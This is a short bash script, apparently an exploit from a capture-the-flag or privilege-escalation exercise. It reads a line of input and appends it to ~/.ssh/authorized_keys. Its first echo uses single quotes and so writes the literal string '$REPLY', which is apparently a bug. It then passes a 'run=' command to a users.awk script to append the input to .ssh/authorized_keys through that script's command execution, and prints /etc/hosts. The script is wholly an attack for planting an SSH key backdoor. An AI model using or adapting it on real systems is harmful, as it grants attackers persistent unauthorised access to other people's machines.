#!/usr/bin/env bash

read; echo '$REPLY' >> ~/.ssh/authorized_keys
./users.awk run="echo $REPLY >> .ssh/authorized_keys" /etc/hosts
cat /etc/hosts
